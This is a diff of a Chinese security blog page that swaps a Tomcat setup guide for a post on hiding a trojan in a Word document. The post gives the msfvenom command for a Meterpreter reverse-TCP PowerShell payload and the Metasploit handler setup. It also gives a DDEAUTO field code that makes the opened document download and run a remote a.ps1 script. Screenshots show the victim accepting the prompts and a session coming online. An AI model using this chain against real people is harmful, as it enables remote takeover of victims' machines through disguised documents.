@@ -79,22 +79,27 @@
 
 
 
-<meta name="description" content="任何一件事，只要心甘情愿，总是能够变得简单，不会有任何复杂的借口和理由。">
 <meta name="keywords" content="WEB安全|黑客技术|渗透测试|黑盒测试|网络安全">
 <meta property="og:type" content="article">
-<meta property="og:title" content="kali环境下搭建Tomcat服务器">
-<meta property="og:url" content="http://yoursite.com/2020/02/12/kali环境下搭建Tomcat服务器/index.html">
+<meta property="og:title" content="Powershell配合Word伪装木马MSF上线">
+<meta property="og:url" content="http://yoursite.com/2020/04/30/Powershell配合Word伪装木马MSF上线/index.html">
 <meta property="og:site_name" content="Assassins 小白">
-<meta property="og:description" content="任何一件事，只要心甘情愿，总是能够变得简单，不会有任何复杂的借口和理由。">
 <meta property="og:locale" content="default">
-<meta property="og:image" content="http://yoursite.com/img/20-2-12/1.png">
-<meta property="og:image" content="http://yoursite.com/img/20-2-12/2.png">
-<meta property="og:image" content="http://yoursite.com/img/20-2-12/3.png">
-<meta property="og:updated_time" content="2020-02-28T15:52:29.884Z">
+<meta property="og:image" content="https://raw.githubusercontent.com/Assassins-white/imgs/mastrt/img/20200430234507.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Assassins-white/imgs/mastrt/img/20200430234846.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Assassins-white/imgs/mastrt/img/20200501221647.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Assassins-white/imgs/mastrt/img/20200430235117.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Assassins-white/imgs/mastrt/img/20200430235433.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Assassins-white/imgs/mastrt/img/20200430235519.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Assassins-white/imgs/mastrt/img/20200501000435.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Assassins-white/imgs/mastrt/img/20200501000241.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Assassins-white/imgs/mastrt/img/20200501000621.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Assassins-white/imgs/mastrt/img/20200501230133.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Assassins-white/imgs/mastrt/img/20200501230314.png">
+<meta property="og:updated_time" content="2020-05-01T15:15:17.440Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="kali环境下搭建Tomcat服务器">
-<meta name="twitter:description" content="任何一件事，只要心甘情愿，总是能够变得简单，不会有任何复杂的借口和理由。">
-<meta name="twitter:image" content="http://yoursite.com/img/20-2-12/1.png">
+<meta name="twitter:title" content="Powershell配合Word伪装木马MSF上线">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/Assassins-white/imgs/mastrt/img/20200430234507.png">
 
 
 
@@ -124,13 +129,13 @@
 
 
 
-  <link rel="canonical" href="http://yoursite.com/2020/02/12/kali环境下搭建Tomcat服务器/">
+  <link rel="canonical" href="http://yoursite.com/2020/04/30/Powershell配合Word伪装木马MSF上线/">
 
 
 
 
 
-  <title>kali环境下搭建Tomcat服务器 | Assassins 小白</title>
+  <title>Powershell配合Word伪装木马MSF上线 | Assassins 小白</title>
   
 
 
@@ -237,7 +242,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/02/12/kali环境下搭建Tomcat服务器/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/04/30/Powershell配合Word伪装木马MSF上线/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="Assassins 小白">
@@ -254,7 +259,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">kali环境下搭建Tomcat服务器</h1>
+          <h1 class="post-title" itemprop="name headline">Powershell配合Word伪装木马MSF上线</h1>
         
 
         <div class="post-meta">
@@ -266,8 +271,8 @@
               
                 <span class="post-meta-item-text">Posted on</span>
               
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2020-02-12T13:41:26+08:00">
-                2020-02-12
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2020-04-30T23:26:54+08:00">
+                2020-04-30
               </time>
             
 
@@ -304,39 +309,42 @@
       
 
       
-        <p>任何一件事，只要心甘情愿，总是能够变得简单，不会有任何复杂的借口和理由。</p>
-<hr>
+        <hr>
 <a id="more"></a>
 
-
-
-
-<h3 id="JDK的安装和配置"><a href="#JDK的安装和配置" class="headerlink" title="JDK的安装和配置"></a>JDK的安装和配置</h3><p>下载 <code>jdk-8u241-linux-x64.tar.gz</code> 传到kali下  <code>/usr/local/xb</code></p>
-<p>官网下载地址 <a href="http://www.oracle.com/technetwork/java/javase/downloads/jdk8-downloads-2133151.html" target="_blank" rel="noopener">http://www.oracle.com/technetwork/java/javase/downloads/jdk8-downloads-2133151.html</a></p>
-<p>解压并重命名文件</p>
-<p><code>tar zxvf jdk-8u241-linux-x64.tar.gz</code></p>
-<p><code>mv jdk-8u241-linux-x64.tar.gz jdk1.8</code></p>
-<p>编辑配置文件 <code>etc/profile</code>  </p>
-<p>在文档最下方添加以下环境变量配置代码</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">export JAVA_HOME=/usr/local/xb/jdk1.8</span><br><span class="line">export JRE_HOME=$&#123;JAVA_HOME&#125;/jre</span><br><span class="line">export CLASSPATH=.:$&#123;JAVA_HOME&#125;/lib:$&#123;JRE_HOME&#125;/lib:$CLASSPATH</span><br><span class="line">export JAVA_PATH=$&#123;JAVA_HOME&#125;/bin:$&#123;JRE_HOME&#125;/bin</span><br><span class="line">export PATH=$PATH:$&#123;JAVA_PATH&#125;</span><br></pre></td></tr></table></figure>
-
-<p><img src="../../../../img/20-2-12/1.png" alt></p>
-<p>使配置立即生效</p>
-<p><code>source /etc/profile</code></p>
-<h3 id="Tomcat的安装和配置"><a href="#Tomcat的安装和配置" class="headerlink" title="Tomcat的安装和配置"></a>Tomcat的安装和配置</h3><p>下载 <code>apache-tomcat-8.5.50.tar.gz</code> 传到kali下 <code>/usr/local/xb</code></p>
-<p>官网下载地址  <a href="http://tomcat.apache.org/download-80.cgi" target="_blank" rel="noopener">http://tomcat.apache.org/download-80.cgi</a> </p>
-<p><img src="../../../../img/20-2-12/2.png" alt></p>
-<p>解压并重命名文件</p>
-<p><code>tar zxvf apache-tomcat-8.5.50.tar.gz</code><br><code>mv apache-tomcat-8.5.50  tomcat8.5.50</code></p>
-<p>编辑配置文件 <code>etc/profile</code>  </p>
-<p>在文档最下方添加以下环境变量配置代码</p>
-<p><code>export CATALINA_HOME=/usr/local/software/tomcat8.5.50</code></p>
-<p>使配置立即生效</p>
-<p><code>source /etc/profile</code></p>
-<h3 id="启动Tomcat服务"><a href="#启动Tomcat服务" class="headerlink" title="启动Tomcat服务"></a>启动Tomcat服务</h3><p><code>./tomcat8.5.50/bin/startup.sh</code></p>
-<h3 id="关闭Tomcat服务"><a href="#关闭Tomcat服务" class="headerlink" title="关闭Tomcat服务"></a>关闭Tomcat服务</h3><p><code>./tomcat8.5.50/bin/shutdown.sh</code></p>
-<h3 id="tomcat根目录"><a href="#tomcat根目录" class="headerlink" title="tomcat根目录"></a>tomcat根目录</h3><p><code>tomcat8.5.50/webapps/ROOT</code></p>
-<p><img src="../../../../img/20-2-12/3.png" alt></p>
+<h5 id="Msfvenom生成Powershell木马"><a href="#Msfvenom生成Powershell木马" class="headerlink" title="Msfvenom生成Powershell木马"></a>Msfvenom生成Powershell木马</h5><blockquote>
+<p>msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.163.132 LPORT=1120 -f psh-reflection -o a.ps1</p>
+</blockquote>
+<p><img src="https://raw.githubusercontent.com/Assassins-white/imgs/mastrt/img/20200430234507.png" alt></p>
+<h5 id="Msf设置侦听"><a href="#Msf设置侦听" class="headerlink" title="Msf设置侦听"></a>Msf设置侦听</h5><blockquote>
+<p>handler -H 192.168.163.132 -P 1120 -p windows/x64/meterpreter/reverse_tcp</p>
+</blockquote>
+<p><img src="https://raw.githubusercontent.com/Assassins-white/imgs/mastrt/img/20200430234846.png" alt></p>
+<h5 id="这里使用2013版Word文档"><a href="#这里使用2013版Word文档" class="headerlink" title="这里使用2013版Word文档"></a>这里使用2013版Word文档</h5><p><img src="https://raw.githubusercontent.com/Assassins-white/imgs/mastrt/img/20200501221647.png" alt></p>
+<ul>
+<li>一</li>
+</ul>
+<p><img src="https://raw.githubusercontent.com/Assassins-white/imgs/mastrt/img/20200430235117.png" alt></p>
+<ul>
+<li>二</li>
+</ul>
+<p><img src="https://raw.githubusercontent.com/Assassins-white/imgs/mastrt/img/20200430235433.png" alt></p>
+<ul>
+<li>三</li>
+</ul>
+<p><img src="https://raw.githubusercontent.com/Assassins-white/imgs/mastrt/img/20200430235519.png" alt></p>
+<h5 id="域代码"><a href="#域代码" class="headerlink" title="域代码"></a>域代码</h5><blockquote>
+<p>DDEAUTO C:\\windows\\system32\\cmd.exe “/k powershell IEX (New-Object Net.WebClient).DownloadString(‘<a href="http://xxx.xxx.xxx.xxx/a.ps1&#39;);&quot;" target="_blank" rel="noopener">http://xxx.xxx.xxx.xxx/a.ps1&#39;);&quot;</a></p>
+</blockquote>
+<p>插入域代码</p>
+<p><img src="https://raw.githubusercontent.com/Assassins-white/imgs/mastrt/img/20200501000435.png" alt></p>
+<p>打开，点击是</p>
+<p><img src="https://raw.githubusercontent.com/Assassins-white/imgs/mastrt/img/20200501000241.png" alt></p>
+<p>点击是</p>
+<p><img src="https://raw.githubusercontent.com/Assassins-white/imgs/mastrt/img/20200501000621.png" alt></p>
+<p>确定</p>
+<p><img src="https://raw.githubusercontent.com/Assassins-white/imgs/mastrt/img/20200501230133.png" alt></p>
+<h5 id="Msf上线"><a href="#Msf上线" class="headerlink" title="Msf上线"></a>Msf上线</h5><p><img src="https://raw.githubusercontent.com/Assassins-white/imgs/mastrt/img/20200501230314.png" alt></p>
 
       
     </div>
@@ -361,8 +369,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2019/10/12/测试某疑似被黑站点/" rel="next" title="测试某疑似被黑站点">
-                <i class="fa fa-chevron-left"></i> 测试某疑似被黑站点
+              <a href="/2020/04/26/Poweshell配合Metasploit无文件落地攻击/" rel="next" title="Poweshell配合Metasploit无文件落地攻击">
+                <i class="fa fa-chevron-left"></i> Poweshell配合Metasploit无文件落地攻击
               </a>
             
           </div>
@@ -370,10 +378,6 @@
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2020/02/14/使用SSR结合BurpSuite进行抓包/" rel="prev" title="使用SSR结合BurpSuite进行抓包">
-                使用SSR结合BurpSuite进行抓包 <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
@@ -520,7 +524,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#JDK的安装和配置"><span class="nav-number">1.</span> <span class="nav-text">JDK的安装和配置</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Tomcat的安装和配置"><span class="nav-number">2.</span> <span class="nav-text">Tomcat的安装和配置</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#启动Tomcat服务"><span class="nav-number">3.</span> <span class="nav-text">启动Tomcat服务</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#关闭Tomcat服务"><span class="nav-number">4.</span> <span class="nav-text">关闭Tomcat服务</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#tomcat根目录"><span class="nav-number">5.</span> <span class="nav-text">tomcat根目录</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-5"><a class="nav-link" href="#Msfvenom生成Powershell木马"><span class="nav-number">1.</span> <span class="nav-text">Msfvenom生成Powershell木马</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#Msf设置侦听"><span class="nav-number">2.</span> <span class="nav-text">Msf设置侦听</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#这里使用2013版Word文档"><span class="nav-number">3.</span> <span class="nav-text">这里使用2013版Word文档</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#域代码"><span class="nav-number">4.</span> <span class="nav-text">域代码</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#Msf上线"><span class="nav-number">5.</span> <span class="nav-text">Msf上线</span></a></li></ol></div>
             
 
           </div>
